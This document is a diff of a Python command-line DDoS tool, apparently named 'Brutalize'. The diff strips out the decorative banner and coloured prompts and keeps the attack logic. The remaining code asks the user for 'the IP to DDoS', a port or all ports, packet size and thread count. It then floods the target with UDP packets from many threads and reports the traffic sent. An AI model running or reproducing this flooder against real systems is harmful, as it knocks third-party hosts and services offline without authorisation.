@@ -4,10 +4,7 @@ from threading import Thread
 from random import choices, randint
 from time import time, sleep
 
-from pystyle import *
 from getpass import getpass as hinput
-
-
 
 class Brutalize:
 
@@ -18,7 +15,6 @@ class Brutalize:
         self.threads = threads # default: 100
 
         self.client = socket(family=AF_INET, type=SOCK_DGRAM)
-        # self.data = self._randbytes()
         self.data = str.encode("x" * self.force)
         self.len = len(self.data)
 
@@ -30,7 +26,6 @@ class Brutalize:
         Thread(target=self.info).start()
     
     def info(self):
-
         interval = 0.05
         now = time()
 
@@ -40,7 +35,6 @@ class Brutalize:
         bytediff = 8
         mb = 1000000
         gb = 1000000000
-        
 
         while self.on:
             sleep(interval)
@@ -48,8 +42,8 @@ class Brutalize:
                 break
 
             if size != 0:
-                self.total += self.sent * bytediff / gb * interval
-                print(stage(f"{fluo}{round(size)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {' '*20}"), end='\r')
+                self.total += self.sent *bytediff / gb* interval
+                print(f"{round(size)} Mb/s - Total: {round(self.total, 1)} Gb.                    ", end='\r')
 
             now2 = time()
         
@@ -77,63 +71,8 @@ class Brutalize:
     def _randport(self):
         return self.port or randint(1, 65535)
 
-
-
-
-ascii = r'''
-$$$$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\  
-$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
-$$ |  $$ |$$ |  $$ |$$ /  $$ |$$ /  \__|
-$$ |  $$ |$$ |  $$ |$$ |  $$ |\$$$$$$\  
-$$ |  $$ |$$ |  $$ |$$ |  $$ | \____$$\ 
-$$ |  $$ |$$ |  $$ |$$ |  $$ |$$\   $$ |
-$$$$$$$  |$$$$$$$  | $$$$$$  |\$$$$$$  |
-\_______/ \_______/  \______/  \______/
-
-
-            made by github.com/yuhertz
-                Created by Hertz
-'''
-
-
-
-banner = r""""""
-
-
-banner = Add.Add(ascii, banner, center=True)
-
-fluo = Col.light_red
-fluo2 = Col.light_gray
-white = Col.yellow
-
-blue = Col.StaticMIX((Col.blue, Col.black))
-bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
-purple = Col.StaticMIX((Col.purple, blue, Col.white))
-
-
-def init():
-    System.Size(140, 40)                                                                                                                                                                                                                                                                   ,System.Title(".B.r.u.t.e. .-. .b.y. .b.i.l.l.y.t.h.e.g.o.a.t.3.5.6.".replace('.',''))
-    Cursor.HideCursor()
-
-
-init()
-
-
-def stage(text, symbol = '...'):
-    col1 = purple
-    col2 = white
-    return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"
-
-def error(text, start='\n'):
-    hinput(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
-    exit()
-
-
 def main():
-    print()
-    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))
-
-    ip = input(stage(f"Enter the IP to DDoS {purple}->{fluo2} ", '?'))
+    ip = input("Enter the IP to DDoS -> ")
     print()
 
     try:
@@ -141,11 +80,10 @@ def main():
             int('error')
         int(ip.replace('.',''))
     except:
-        error("Error! Please enter a correct IP address.")
+        print("Error! Please enter a correct IP address.")
+        exit()
 
-
-
-    port = input(stage(f"Enter port {purple}[{white}press {fluo2}enter{white} to attack all ports{purple}] {purple}->{fluo2} ", '?'))
+    port = input("Enter port [press enter to attack all ports] -> ")
     print()
 
     if port == '':
@@ -156,9 +94,10 @@ def main():
             if port not in range(1, 65535 + 1):
                 int('error')
         except ValueError:
-            error("Error! Please enter a correct port.")
+            print("Error! Please enter a correct port.")
+            exit()
 
-    force = input(stage(f"Bytes per packet {purple}[{white}press {fluo2}enter{white} for 1250{purple}] {purple}->{fluo2} ", '?'))
+    force = input("Bytes per packet [press enter for 1250] -> ")
     print()
 
     if force == '':
@@ -167,10 +106,10 @@ def main():
         try:
             force = int(force)
         except ValueError:
-            error("Error! Please enter an integer.")
+            print("Error! Please enter an integer.")
+            exit()
 
-
-    threads = input(stage(f"Threads {purple}[{white}press {fluo2}enter{white} for 100{purple}] {purple}->{fluo2} ", '?'))
+    threads = input("Threads [press enter for 100] -> ")
     print()
 
     if threads == '':
@@ -179,30 +118,30 @@ def main():
         try:
             threads = int(threads)
         except ValueError:
-            error("Error! Please enter an integer.")
-
+            print("Error! Please enter an integer.")
+            exit()
 
     print()
-    cport = '' if port is None else f'{purple}:{fluo2}{port}'
-    print(stage(f"Starting attack on {fluo2}{ip}{cport}{white}."), end='\r')
-
+    cport = '' if port is None else f':{port}'
+    print(f"Starting attack on {ip}{cport}.", end='\r')
 
     brute = Brutalize(ip, port, force, threads)
     try:
         brute.flood()
     except:
         brute.stop()
-        error("A fatal error has occured and the attack was stopped.", '')
+        print("A fatal error has occured and the attack was stopped.")
+        exit()
+
     try:
         while True:
             sleep(1000000)
     except KeyboardInterrupt:
         brute.stop()
-        print(stage(f"Attack stopped. {fluo2}{ip}{cport}{white} was Brutalized with {fluo}{round(brute.total, 1)} {white}Gb.", '.'))
+        print(f"Attack stopped. {ip}{cport} was Brutalized with {round(brute.total, 1)} Gb.")
     print('\n')
     sleep(1)
-
-    hinput(stage(f"Press {fluo2}enter{white} to {fluo}exit{white}.", '.'))
+    input("Press enter to exit.")
 
 if __name__ == '__main__':
-    main()    
+    main()
